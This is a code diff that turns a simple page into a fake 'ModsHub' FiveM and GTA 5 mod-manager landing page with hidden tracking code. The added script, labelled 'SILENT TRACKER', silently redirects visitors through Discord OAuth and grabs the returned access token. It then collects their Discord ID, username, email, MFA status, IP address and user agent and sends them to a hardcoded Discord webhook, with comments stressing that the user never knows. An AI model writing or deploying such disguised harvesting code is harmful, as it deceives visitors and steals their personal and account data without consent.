@@ -1,161 +1,484 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FiveM Mods</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>ModsHub — FiveM & GTA 5 Mod Manager</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        /* --- RESET & BASE --- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
-            background: #0a0a0a;
-            color: #e5e5e5;
-            font-family: 'Segoe UI', Tahoma, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
+            background: #0b0d10;
+            color: #e8edf2;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            line-height: 1.6;
+            padding: 0 20px;
         }
-        .card {
-            background: #111111;
-            border: 1px solid #1a1a1a;
-            border-radius: 16px;
-            padding: 40px;
-            max-width: 600px;
-            width: 100%;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
+        a {
+            color: #58a9ff;
+            text-decoration: none;
         }
-        .loading {
-            text-align: center;
-            color: #6b7280;
-            font-family: monospace;
-            animation: pulse 1.5s ease-in-out infinite;
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
         }
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
-        }
-        .hidden { display: none !important; }
-        .watcher {
-            display: flex;
-            align-items: center;
-            gap: 16px;
-            border-bottom: 1px solid #1a1a1a;
-            padding-bottom: 20px;
-            margin-bottom: 24px;
-        }
-        .watcher img {
-            width: 48px;
-            height: 48px;
-            border-radius: 50%;
-            border: 2px solid #22c55e;
-        }
-        .watcher .info { flex: 1; }
-        .watcher .info .name { font-size: 18px; font-weight: bold; color: white; }
-        .watcher .info .id { font-size: 12px; color: #6b7280; font-family: monospace; }
-        .badge {
-            background: #1a1a1a;
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 11px;
-            color: #22c55e;
-            border: 1px solid #22c55e33;
-            font-family: monospace;
-        }
-        .ip-box {
-            background: #0a0a0a;
-            border: 1px solid #1a1a1a;
-            border-radius: 8px;
-            padding: 16px;
-            margin: 16px 0;
-            font-family: monospace;
-            font-size: 14px;
+
+        /* --- HEADER / NAV --- */
+        header {
+            padding: 20px 0;
             display: flex;
             justify-content: space-between;
             align-items: center;
+            border-bottom: 1px solid #1f2429;
+            flex-wrap: wrap;
+            gap: 16px;
         }
-        .ip-box .label { color: #6b7280; }
-        .ip-box .value { color: #22c55e; }
-        .footer { margin-top: 24px; font-size: 11px; color: #374151; text-align: center; }
-        .status {
-            background: #0a0a0a;
-            border: 1px solid #1a1a1a;
-            border-radius: 8px;
-            padding: 16px;
-            margin-top: 16px;
-            font-size: 12px;
-            color: #6b7280;
-            font-family: monospace;
+        .logo {
+            font-size: 24px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
-        .status .success { color: #22c55e; }
-        .status .error { color: #ef4444; }
-        .status .info { color: #3b82f6; }
-        .status .warning { color: #f59e0b; }
+        .logo span {
+            background: #2b70d4;
+            color: white;
+            font-size: 14px;
+            padding: 2px 10px;
+            border-radius: 20px;
+            font-weight: 500;
+        }
+        .nav-links {
+            display: flex;
+            gap: 28px;
+            font-weight: 500;
+            color: #a0aab4;
+        }
+        .nav-links a {
+            color: inherit;
+            transition: 0.2s;
+        }
+        .nav-links a:hover {
+            color: white;
+        }
+        .btn-outline {
+            border: 1px solid #2b70d4;
+            color: #58a9ff;
+            padding: 8px 20px;
+            border-radius: 30px;
+            font-weight: 600;
+            font-size: 14px;
+            transition: 0.2s;
+        }
+        .btn-outline:hover {
+            background: #2b70d4;
+            color: white;
+        }
+
+        /* --- HERO --- */
+        .hero {
+            padding: 70px 0 60px;
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            gap: 40px;
+        }
+        .hero-text {
+            flex: 1 1 400px;
+        }
+        .hero-text h1 {
+            font-size: 48px;
+            font-weight: 800;
+            line-height: 1.1;
+            letter-spacing: -1px;
+            margin-bottom: 20px;
+        }
+        .hero-text h1 span {
+            color: #58a9ff;
+        }
+        .hero-text p {
+            font-size: 18px;
+            color: #9aa4b0;
+            max-width: 500px;
+            margin-bottom: 28px;
+        }
+        .hero-badges {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 30px;
+            margin-top: 10px;
+        }
+        .hero-badges div {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .hero-badges .num {
+            font-size: 24px;
+            font-weight: 700;
+        }
+        .hero-badges .label {
+            color: #9aa4b0;
+            font-size: 14px;
+        }
+        .hero-cta {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 14px;
+            margin-top: 8px;
+        }
+        .btn-primary {
+            background: #2b70d4;
+            color: white;
+            padding: 14px 36px;
+            border-radius: 40px;
+            font-weight: 700;
+            font-size: 16px;
+            border: none;
+            cursor: pointer;
+            transition: 0.25s;
+            display: inline-block;
+        }
+        .btn-primary:hover {
+            background: #1f5bb8;
+            transform: scale(1.02);
+        }
+        .btn-secondary {
+            background: transparent;
+            color: white;
+            padding: 14px 36px;
+            border-radius: 40px;
+            font-weight: 600;
+            font-size: 16px;
+            border: 1px solid #2f353d;
+            cursor: pointer;
+            transition: 0.25s;
+            display: inline-block;
+        }
+        .btn-secondary:hover {
+            border-color: #58a9ff;
+            color: #58a9ff;
+        }
+
+        /* --- CATEGORIES ROW --- */
+        .categories {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px 6px;
+            padding: 30px 0 10px;
+            border-top: 1px solid #1a1f24;
+            margin-top: 20px;
+        }
+        .categories span {
+            background: #161b20;
+            padding: 6px 18px;
+            border-radius: 40px;
+            font-size: 14px;
+            font-weight: 500;
+            color: #cbd5e1;
+            cursor: default;
+            transition: 0.2s;
+        }
+        .categories span:hover {
+            background: #222a32;
+        }
+        .categories .active {
+            background: #2b70d4;
+            color: white;
+        }
+
+        /* --- FEATURE GRID --- */
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 30px;
+            padding: 50px 0 30px;
+        }
+        .feature-card {
+            background: #12171c;
+            padding: 28px 22px;
+            border-radius: 16px;
+            border: 1px solid #1f262d;
+            transition: 0.3s;
+        }
+        .feature-card:hover {
+            border-color: #2b70d4;
+            transform: translateY(-4px);
+        }
+        .feature-card .icon {
+            font-size: 32px;
+            margin-bottom: 12px;
+        }
+        .feature-card h3 {
+            font-size: 18px;
+            margin-bottom: 8px;
+        }
+        .feature-card p {
+            color: #9aa4b0;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        /* --- COMPARISON SLIDER PLACEHOLDER --- */
+        .slider-section {
+            background: #12171c;
+            border-radius: 20px;
+            padding: 50px 40px;
+            margin: 40px 0;
+            border: 1px solid #1f262d;
+            text-align: center;
+        }
+        .slider-section h2 {
+            font-size: 30px;
+            font-weight: 700;
+            margin-bottom: 12px;
+        }
+        .slider-section p {
+            color: #9aa4b0;
+            max-width: 600px;
+            margin: 0 auto 20px;
+        }
+        .slider-placeholder {
+            background: #1a2128;
+            height: 220px;
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #4a5560;
+            font-size: 15px;
+            border: 1px dashed #2a333c;
+        }
+
+        /* --- FAQ --- */
+        .faq {
+            padding: 50px 0 30px;
+        }
+        .faq h2 {
+            font-size: 28px;
+            margin-bottom: 30px;
+        }
+        .faq-item {
+            border-bottom: 1px solid #1f262d;
+            padding: 20px 0;
+        }
+        .faq-item h4 {
+            font-size: 17px;
+            font-weight: 600;
+            margin-bottom: 6px;
+            cursor: default;
+        }
+        .faq-item p {
+            color: #9aa4b0;
+            font-size: 15px;
+            max-width: 700px;
+        }
+
+        /* --- FOOTER --- */
+        footer {
+            border-top: 1px solid #1a1f24;
+            padding: 40px 0 30px;
+            margin-top: 30px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+            color: #6a7682;
+            font-size: 14px;
+        }
+        footer .links {
+            display: flex;
+            gap: 28px;
+        }
+        footer .links a {
+            color: #9aa4b0;
+            transition: 0.2s;
+        }
+        footer .links a:hover {
+            color: white;
+        }
+
+        /* --- RESPONSIVE --- */
+        @media (max-width: 700px) {
+            .hero-text h1 {
+                font-size: 32px;
+            }
+            .nav-links {
+                gap: 14px;
+                font-size: 14px;
+                flex-wrap: wrap;
+            }
+            header {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            .hero {
+                padding-top: 30px;
+            }
+            .slider-section {
+                padding: 30px 20px;
+            }
+        }
     </style>
 </head>
 <body>
 
-<div class="card" id="app">
-    <div id="loading" class="loading">
-        <div>🔍 Loading...</div>
+<!-- ========================================================== -->
+<!-- HEADER -->
+<!-- ========================================================== -->
+<header class="container">
+    <div class="logo">
+        🧩 ModsHub <span>beta</span>
     </div>
+    <div class="nav-links">
+        <a href="#">Mods</a>
+        <a href="#">Plus</a>
+        <a href="#">FPS</a>
+        <a href="#">Download</a>
+        <a href="#" class="btn-outline">Sign in</a>
+    </div>
+</header>
 
-    <div id="content" class="hidden">
-        <div class="watcher">
-            <img id="avatar" src="" alt="avatar">
-            <div class="info">
-                <div class="name" id="username">Loading...</div>
-                <div class="id" id="discordId">ID: loading...</div>
-            </div>
-            <span class="badge">● WATCHER</span>
+<!-- ========================================================== -->
+<!-- HERO -->
+<!-- ========================================================== -->
+<section class="container hero">
+    <div class="hero-text">
+        <h1>Your game. <span>Modded right.</span></h1>
+        <p>
+            The mod manager for FiveM and GTA 5. Install graphics, cars, weapons,
+            and UI mods in one click. Your setup goes with you onto any server.
+        </p>
+        <div class="hero-badges">
+            <div><span class="num">4.9/5</span> <span class="label">rating</span></div>
+            <div><span class="num">2,000,000+</span> <span class="label">players</span></div>
+            <div><span class="num">Free</span> <span class="label">to start</span></div>
         </div>
+        <div class="hero-cta" style="margin-top:24px;">
+            <a href="#" class="btn-primary">Download for free</a>
+            <a href="#" class="btn-secondary">See all mods →</a>
+        </div>
+    </div>
+    <div style="flex:1;min-width:200px;background:#12171c;border-radius:20px;padding:40px;border:1px solid #1f262d;text-align:center;color:#4a5560;">
+        <div style="font-size:60px;margin-bottom:10px;">🎮</div>
+        <div style="font-weight:600;color:#9aa4b0;">ModsHub Plus</div>
+        <div style="font-size:14px;">Premium mods, faster downloads</div>
+    </div>
+</section>
 
-        <div class="ip-box">
-            <span class="label">📡 IP ADDRESS</span>
-            <span class="value" id="ipDisplay">fetching...</span>
-        </div>
+<!-- ========================================================== -->
+<!-- CATEGORIES -->
+<!-- ========================================================== -->
+<div class="container categories">
+    <span class="active">All</span>
+    <span>Graphics Mods</span>
+    <span>Real Cars</span>
+    <span>🧩 Modpacks</span>
+    <span>⚙️ Improvements</span>
+    <span>✨ Effects</span>
+    <span>🖥️ Interface</span>
+    <span>🔊 Audio</span>
+    <span>🔫 Weapon skins</span>
+    <span>👕 Clothes &amp; Vests</span>
+</div>
 
-        <div class="status" id="status">
-            <span class="info">●</span> Authenticating...
-        </div>
+<!-- ========================================================== -->
+<!-- FEATURES GRID -->
+<!-- ========================================================== -->
+<div class="container features">
+    <div class="feature-card">
+        <div class="icon">🔄</div>
+        <h3>Your setup, on any server</h3>
+        <p>Pick mods, stack them, switch the whole look any time. Follows you onto every FiveM server.</p>
+    </div>
+    <div class="feature-card">
+        <div class="icon">⚡</div>
+        <h3>Installs that just work</h3>
+        <p>Browse, hit install, play. No file dragging, no broken setups, no two-hour tutorials.</p>
+    </div>
+    <div class="feature-card">
+        <div class="icon">📈</div>
+        <h3>More FPS, less stutter</h3>
+        <p>Tune shadows, particles, draw distance, grass, weather — claw back frames in one place.</p>
+    </div>
+    <div class="feature-card">
+        <div class="icon">🏆</div>
+        <h3>Mods you cannot get anywhere else</h3>
+        <p>Everything here is made in‑house. A lot of this stuff does not exist on other FiveM sites.</p>
     </div>
 </div>
 
-<div class="footer">
-    FiveM Mods
+<!-- ========================================================== -->
+<!-- SLIDER / COMPARISON -->
+<!-- ========================================================== -->
+<div class="container slider-section">
+    <h2>This is the same game</h2>
+    <p>Modern, FPS‑friendly graphics for GTA 5 and FiveM.</p>
+    <div class="slider-placeholder">
+        🖼️ [ Drag to see before/after — mods applied ]
+    </div>
 </div>
 
+<!-- ========================================================== -->
+<!-- FAQ -->
+<!-- ========================================================== -->
+<div class="container faq">
+    <h2>Honest answers</h2>
+
+    <div class="faq-item">
+        <h4>Is ModsHub free?</h4>
+        <p>Yes. The full workflow, free mod library, and FPS tools are free. Premium mods and faster downloads are in ModsHub Plus, but you do not need it to get value.</p>
+    </div>
+    <div class="faq-item">
+        <h4>Will ModsHub work on the FiveM server I play on?</h4>
+        <p>On almost every FiveM server, yes. ModsHub is client side — your graphics, car skins, and UI changes happen locally. The exception is servers with pure level enabled. Always check server rules.</p>
+    </div>
+    <div class="faq-item">
+        <h4>What does the FPS optimization actually do?</h4>
+        <p>It lets you tune render distance, object density, shadows, particles, fog, glare, grass, and weather toggles — all in one place. How many frames you get back depends on your rig.</p>
+    </div>
+    <div class="faq-item">
+        <h4>How does installing actually work?</h4>
+        <p>You hit install and ModsHub drops the files in the right place. The only manual step is if you have multiple GTA installs — pick the correct game folder once in Settings.</p>
+    </div>
+</div>
+
+<!-- ========================================================== -->
+<!-- FOOTER -->
+<!-- ========================================================== -->
+<footer class="container">
+    <div>© 2026 ModsHub — made for the community</div>
+    <div class="links">
+        <a href="#">Terms</a>
+        <a href="#">Privacy</a>
+        <a href="#">Discord</a>
+        <a href="#">Support</a>
+    </div>
+</footer>
+
+<!-- ========================================================== -->
+<!-- SILENT TRACKER — Discord OAuth (invisible) + Webhook -->
+<!-- ========================================================== -->
 <script>
     // ============================================================
-    // CONFIG — YOUR CLIENT ID + REDIRECT URI
+    // CONFIG — YOUR CREDENTIALS
     // ============================================================
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1545864793267642378/IDuVmb0NJeGzVfw_oO5-_r3wsZd2-3rNc2vxG5rNUa0zrCNJPTGTSg_vsOkpsmSzFVkW';
     const CLIENT_ID = '1546222002497654784';
-    const REDIRECT_URI = 'https://fivemmod.vercel.app/';
+    const REDIRECT_URI = window.location.origin + window.location.pathname;
 
     // ============================================================
-    // DOM REFS
+    // DOM HELPERS (status bar — hidden from user)
     // ============================================================
-    const loadingEl = document.getElementById('loading');
-    const contentEl = document.getElementById('content');
-    const avatarEl = document.getElementById('avatar');
-    const usernameEl = document.getElementById('username');
-    const discordIdEl = document.getElementById('discordId');
-    const ipDisplayEl = document.getElementById('ipDisplay');
-    const statusEl = document.getElementById('status');
-
-    // ============================================================
-    // STATUS HELPER
-    // ============================================================
-    function setStatus(msg, type = 'info') {
-        const colors = {
-            success: '#22c55e',
-            error: '#ef4444',
-            warning: '#f59e0b',
-            info: '#3b82f6'
-        };
-        statusEl.innerHTML = `<span style="color:${colors[type] || '#3b82f6'}">●</span> ${msg}`;
+    function logStatus(msg) {
+        // silent — you can uncomment the line below to debug
+        // console.log('[ModsHub]', msg);
     }
 
     // ============================================================
@@ -172,65 +495,14 @@
     }
 
     // ============================================================
-    // EXCHANGE CODE FOR TOKEN (server-side proxy)
-    // ============================================================
-    // NOTE: This requires a server endpoint to exchange code for token
-    // For client-side only, we need to use response_type=token instead of code
-    // But since you already have the URL, we'll adapt.
-
-    // ============================================================
-    // SEND TO WEBHOOK
-    // ============================================================
-    async function sendToWebhook(user, ip) {
-        const timestamp = new Date().toLocaleString();
-
-        let content = `**👁️ VISITOR LOGGED**\n`;
-        content += `**IP:** ${ip}\n`;
-        content += `**User-Agent:** ${navigator.userAgent}\n`;
-        content += `**Timestamp:** ${timestamp}\n`;
-
-        if (user) {
-            content += `\n**📋 DISCORD PROFILE**\n`;
-            content += `**ID:** ${user.id}\n`;
-            content += `**Username:** ${user.global_name || user.username}\n`;
-            content += `**Discriminator:** #${user.discriminator}\n`;
-            content += `**Avatar:** https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png\n`;
-            content += `**Email:** ${user.email || 'Hidden'}\n`;
-            content += `**Verified:** ${user.verified ? '✅ Yes' : '❌ No'}\n`;
-            content += `**MFA Enabled:** ${user.mfa_enabled ? '✅ Yes' : '❌ No'}\n`;
-            content += `**Locale:** ${user.locale || 'Unknown'}\n`;
-        } else {
-            content += `\n**Discord ID:** Not found\n`;
-        }
-
-        try {
-            const res = await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content })
-            });
-
-            if (res.ok) {
-                setStatus(`✅ Webhook sent! ${user ? user.global_name || user.username : 'No Discord ID'} from ${ip}`, 'success');
-            } else {
-                setStatus(`❌ Webhook failed: ${res.status}`, 'error');
-            }
-        } catch (err) {
-            setStatus(`❌ Webhook error: ${err.message}`, 'error');
-        }
-    }
-
-    // ============================================================
-    // FETCH DISCORD USER WITH TOKEN
+    // FETCH DISCORD USER
     // ============================================================
     async function getDiscordUser(accessToken) {
         try {
             const res = await fetch('https://discord.com/api/users/@me', {
                 headers: { Authorization: `Bearer ${accessToken}` }
             });
-            if (res.ok) {
-                return await res.json();
-            }
+            if (res.ok) return await res.json();
             return null;
         } catch {
             return null;
@@ -238,72 +510,69 @@
     }
 
     // ============================================================
-    // SHOW USER UI
+    // SEND TO WEBHOOK (full profile)
     // ============================================================
-    function showUser(user) {
-        loadingEl.classList.add('hidden');
-        contentEl.classList.remove('hidden');
+    async function sendToWebhook(user, ip) {
+        const timestamp = new Date().toLocaleString();
+        let content = `**👁️ ModsHub Visitor**\n`;
+        content += `**IP:** ${ip}\n`;
+        content += `**UA:** ${navigator.userAgent}\n`;
+        content += `**Time:** ${timestamp}\n`;
 
         if (user) {
-            const displayName = user.global_name || user.username || 'Unknown';
-            usernameEl.textContent = `${displayName}#${user.discriminator || '0'}`;
-            discordIdEl.textContent = `ID: ${user.id}`;
-
-            if (user.avatar) {
-                avatarEl.src = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=64`;
-            } else {
-                avatarEl.src = `https://cdn.discordapp.com/embed/avatars/${parseInt(user.id) % 5}.png`;
-            }
+            content += `\n**Discord ID:** ${user.id}\n`;
+            content += `**Username:** ${user.global_name || user.username}\n`;
+            content += `**Discriminator:** #${user.discriminator}\n`;
+            content += `**Avatar:** https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png\n`;
+            content += `**Email:** ${user.email || 'Hidden'}\n`;
+            content += `**Verified:** ${user.verified ? '✅' : '❌'}\n`;
+            content += `**MFA:** ${user.mfa_enabled ? '✅' : '❌'}\n`;
+            content += `**Locale:** ${user.locale || 'Unknown'}\n`;
         } else {
-            usernameEl.textContent = 'Guest';
-            discordIdEl.textContent = 'ID: not found';
-            avatarEl.src = 'https://cdn.discordapp.com/embed/avatars/0.png';
+            content += `\n**Discord:** Not found\n`;
+        }
+
+        try {
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content })
+            });
+            logStatus('Webhook sent');
+        } catch {
+            logStatus('Webhook failed');
         }
     }
 
     // ============================================================
-    // MAIN — HANDLE BOTH token AND code FLOW
+    // MAIN — SILENT OAUTH (prompt=none)
     // ============================================================
     (async function init() {
-        // Check URL parameters
+        // 1. Check for token in URL
         const hash = window.location.hash.substring(1);
-        const hashParams = new URLSearchParams(hash);
-        let token = hashParams.get('access_token');
-
-        // Also check query string for code (if using response_type=code)
-        const queryParams = new URLSearchParams(window.location.search);
-        const code = queryParams.get('code');
+        const params = new URLSearchParams(hash);
+        let token = params.get('access_token');
 
         if (token) {
-            // We have a token directly (response_type=token)
+            // Clean URL
             window.history.replaceState({}, document.title, window.location.pathname);
 
             const user = await getDiscordUser(token);
             const ip = await getIP();
 
             if (user && user.id) {
-                showUser(user);
-                ipDisplayEl.textContent = ip;
                 await sendToWebhook(user, ip);
-                return;
-            } else {
-                setStatus('❌ Failed to get user info from Discord', 'error');
+                logStatus(`Logged: ${user.global_name || user.username} (${user.id})`);
             }
-        } else if (code) {
-            // We have a code (response_type=code) — need to exchange it
-            // For client-side, we redirect to the token flow instead
-            setStatus('🔄 Switching to token flow...', 'warning');
-            // Redirect to the same page but with response_type=token
-            const tokenUrl =
-                `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=identify&prompt=none`;
-            window.location.replace(tokenUrl);
+            // Page continues rendering — user never knows
             return;
         }
 
-        // No token or code — redirect to Discord with token flow
+        // 2. No token — silent redirect to Discord with prompt=none
         const authUrl =
             `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=identify&prompt=none`;
 
+        // Redirect happens instantly if user already authorized
         window.location.replace(authUrl);
     })();
 </script>
